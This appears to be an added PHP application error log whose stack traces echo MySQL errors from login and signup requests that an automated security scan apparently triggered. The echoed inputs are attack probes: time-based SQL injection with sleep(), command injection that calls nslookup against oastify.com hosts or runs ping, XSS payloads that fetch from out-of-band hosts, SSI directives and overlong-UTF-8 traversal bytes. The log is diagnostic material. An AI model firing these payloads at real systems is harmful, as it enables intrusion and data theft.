+#5 {main}
+POST /user/signup
+Incorrect string value: '\xC0\xAE\xC0\xAE\xC0\x9C...' for column 'email' at row 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.sleep(hexdec(dechex(20))).'' AND password = '9324f0e673cdb228326972c7d9742340bd' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.sleep(lc(20)).'' AND password = '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"`0&nslookup -q=cname vmlembodkc1lv61fzdcepltu7ldf1bp8d00qof.oastify.com.&`'' AN' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"`0&nslookup -q=cname h0i00x2zyyf79sf1dzq0377gl7r1fx3srkea2z.oastify.com.&`'' A' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'l2zhooq8h5 zy1x5wur0e||a #|" |echo l2zhooq8h5 zy1x5wur0e||a #' AND password = 'b' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '5anmyapit4 722dkd7u2d #xzwx' AND password = 'b9b30fd11d532ccb581a42cda889ed27b81' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1' AND password = '' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"`0&nslookup -q=cname 4x2nxkzmvlcu6fcoamnn0u43iuooco0lodb3zs.oastify.com.&`'' AN' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1 #' AND password = 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Incorrect string value: '\xC0\xAE\xC0\xAE\xC0\xAF...' for column 'email' at row 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"`0&nslookup -q=cname g0hz0w2yyxf69rf0dyqz367fl6r0f03vrned22.oastify.com.&`'' A' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'okk5ueczkt loafqbdze4||a #|" |echo okk5ueczkt loafqbdze4||a #' AND password = '9' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'oaeyeufvh2 hta2zb1r0k #xzwx' AND password = '9324f0e673cdb228326972c7d9742340bd7' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1' AND password = '' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1 #' AND password = '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Data too long for column 'email' at row 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Data too long for column 'email' at row 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'function(){if(typeof p9nfa==="undefined"){var a=new Date();do{var b=new Date();}' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '->`--><!--#set var="r2j" value="q1i91638z7"--><!--#set var="t4l" value="s3kb385a' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'function(){if(typeof kyybo==="undefined"){var a=new Date();do{var b=new Date();}' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '->`--><!--#set var="z1q" value="y0ph0e2gyf"--><!--#set var="13s" value="02rj2g4i' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'function(){if(typeof xwzc8==="undefined"){var a=new Date();do{var b=new Date();}' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '->`--><!--#set var="r6n" value="q5m9567837"--><!--#set var="t8p" value="s7ob789a' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"><svg/onload=fetch`//9jtsjplrhqyzskytwr9smzq84zatyjmbcz4muaj\.oastify.com`>'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"><svg/onload=fetch`//c2fv2s4u0th2bnhwfusv529bn2twhs5kv8nvdj2\.oastify.com`>' AN' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/ki63i0k2g1xarvx4v283lapj3a9' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"><svg/onload=fetch`//wccfcceeadrml7rgpe2ffmjvxm3grgf85wxjn7c\.oastify.com`>' AN' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/288l8iak6jnshdnmlkylbsf1tsz' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/086j8gai6hnqhbnkliyjbqfztqz' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/update/avatar
+Data too long for column 'avatar' at row 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(150): mysqli->query('UPDATE user SET...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(201): Database::update('user', Array, Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(339): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::avatar_update()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/update/avatar
+Data too long for column 'avatar' at row 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(150): mysqli->query('UPDATE user SET...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(201): Database::update('user', Array, Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(361): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::avatar_update()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
